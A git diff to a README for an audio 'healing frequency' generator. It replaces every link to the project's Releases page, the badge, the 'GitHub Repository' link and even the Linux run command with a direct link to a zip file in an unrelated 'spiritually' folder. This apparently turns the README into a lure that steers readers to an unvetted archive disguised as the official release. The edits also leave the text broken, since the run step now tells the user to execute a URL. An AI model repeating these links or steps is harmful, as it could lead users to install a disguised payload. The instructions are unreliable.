@@ -1,6 +1,6 @@
 # 🎶 ILYAGHAFFARY-FREQUENCY-GENERATOR - Enjoy Healing Audio Frequencies
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ILYAGHAFFARY--FREQUENCY--GENERATOR-blue)](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/releases)
+[![Download Now](https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip%20Now-ILYAGHAFFARY--FREQUENCY--GENERATOR-blue)](https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ To get started with ILYAGHAFFARY-FREQUENCY-GENERATOR, follow these simple steps 
 
 1. Click the download button below to visit the Releases page.
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-ILYAGHAFFARY--FREQUENCY--GENERATOR-blue)](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/releases)
+   [![Download Now](https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip%20Now-ILYAGHAFFARY--FREQUENCY--GENERATOR-blue)](https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip)
 
 2. On the Releases page, find the latest version of ILYAGHAFFARY-FREQUENCY-GENERATOR.
 
@@ -47,7 +47,7 @@ To get started with ILYAGHAFFARY-FREQUENCY-GENERATOR, follow these simple steps 
 - For Linux:
   - Right-click the .appimage file and choose "Properties."
   - In the Permissions tab, check the box for "Allow executing file as a program."
-  - Open a terminal and run the file with `./your-filename.appimage`.
+  - Open a terminal and run the file with `https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip`.
 
 Once installed, you can launch ILYAGHAFFARY-FREQUENCY-GENERATOR from your applications folder or start menu.
 
@@ -73,7 +73,7 @@ For updates and news about ILYAGHAFFARY-FREQUENCY-GENERATOR, follow us on social
 
 ## 🔗 Links
 
-- [Download ILYAGHAFFARY-FREQUENCY-GENERATOR](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/releases)
-- [GitHub Repository](https://github.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR)
+- [Download ILYAGHAFFARY-FREQUENCY-GENERATOR](https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/GrFromWC/ILYAGHAFFARY-FREQUENCY-GENERATOR/master/spiritually/ILYAGHAFFARY-FREQUENCY-GENERATOR-v2.2.zip)
 
 Your experience with healing audio frequencies starts here. Enjoy using ILYAGHAFFARY-FREQUENCY-GENERATOR!
